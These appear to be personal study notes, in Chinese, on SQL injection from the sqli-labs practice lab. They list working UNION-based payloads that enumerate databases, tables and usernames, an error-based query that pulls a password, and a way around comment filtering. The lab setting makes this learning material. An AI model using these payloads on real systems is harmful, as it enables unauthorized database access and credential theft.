## 参考 https://blog.csdn.net/whisper921/article/details/123264920
Level 1  2
http://192.168.1.25/sqli/Less-1/?id=-1' union SELECT 1,1,GROUP_CONCAT(schema_name) FROM information_schema.schemata--+ 拿到所有库名http://192.168.1.25/sqli/Less-1/?id=-1' union SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema ="security"--+ 查询表名
http://192.168.1.25/sqli/Less-1/?id=-1' union  select 1,group_concat(username),3 from security.users--+ 获取表数据

security
uagents,referers,users,emails
name:id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,user_id,first_name,last_name,user,password,avatar,last_login,failed_login

security

验证是否采用数字注入 使用${id}' and 1=2 --+

基于报错注入 select count(*),concat((select password from sys_user limit 1,1), '---',floor(rand(0)*2) ) as a from student  GROUP BY a

SELECT * FROM test WHERE name=''union select 1,2,3'' 如果过滤了注释符号 可以使用 name=''union select 1,2,3'' war!! 不会报错 
SELECT * FROM test WHERE name='' UNION SELECT 1,1,GROUP_CONCAT(table_name) FROM information_schema.TABLES where table_schema=database() or '1'='' 爆表